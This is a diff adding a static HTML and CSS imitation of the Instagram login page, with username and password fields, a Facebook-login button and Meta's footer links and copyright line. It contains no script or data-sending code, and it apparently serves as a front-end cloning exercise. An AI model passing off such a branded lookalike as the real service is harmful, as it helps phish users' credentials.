@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            background-color: white;
+        }
+
+        .form-box {
+            width: 300px;
+            padding: 20px;
+            border: 1px solid #e6e6e6;
+            background-color: white;
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 30px;
+            margin-bottom: 20px;
+            color: black;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"], input[type="password"], input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 90%;
+            padding: 10px;
+            border: none;
+            background-color: #3897f0;
+            color: white;
+            font-size: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #2c76b8;
+        }
+
+        .divider {
+            margin: 20px 0;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px;
+            /* border: 1px solid #ccc; */
+            background-color: whitesmoke;
+            color: #3b5998;
+            font-size: 10px;
+            cursor: pointer;
+            border-radius: 3px;
+            margin-bottom: 20px;
+        }
+
+        .fb-login img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        .forgot-password, .report-content, .signup {
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .forgot-password a, .signup a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover, .signup a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: white;
+            border-top: 1px solid #e6e6e6;
+            /* padding: 2px; */
+            text-align: center;
+            grid-area: 1rem;
+            margin-top: 10rem;
+        }
+
+        .footer-links ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links ul li {
+            margin: 0 10px;
+        }
+
+        .footer-links ul li a {
+            text-decoration: none;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .footer-links ul li a:hover {
+            color: #3897f0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="form-box">
+            <h1>Instagram</h1>
+
+            <!-- Login Form -->
+            <form action="" method="post">
+                <div class="input-group">
+                    <input type="text" name="username" placeholder="phone number,username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="divider">
+                <p>------------ OR -------------</p>
+            </div>
+
+            <button class="fb-login">
+                <img src="facebook-logo.png" alt="Facebook Logo"> Log in with Facebook
+            </button>
+
+            <p class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </p>
+
+            <p class="report-content">
+                You can also report content you believe is unlawful in your country without logging in.
+            </p>
+
+            <p class="signup">
+                Don't have an account? <a href="#">Sign up</a>
+            </p>
+        </div>
+
+        <footer>
+            <div class="footer-links">
+                <ul>
+                    <li><a href="#">Meta</a></li>
+                    <li><a href="#">About</a></li>
+                    <li><a href="#">Blog</a></li>
+                    <li><a href="#">Jobs</a></li>
+                    <li><a href="#">Help</a></li>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Terms</a></li>
+                    <li><a href="#">Locations</a></li>
+                    <li><a href="#">Instagram Lite</a></li>
+                    <li><a href="#">Threads</a></li>
+                    <li><a href="#">Contact Uploading & Non-Users</a></li>
+                    <li><a href="#">Meta Verified</a></li>
+                    <li><a href="#">English</a></li>
+                </ul>
+            </div>
+            <p>© 2025 Instagram from Meta</p>
+        </footer>
+    </div>
+
+</body>
+</html>
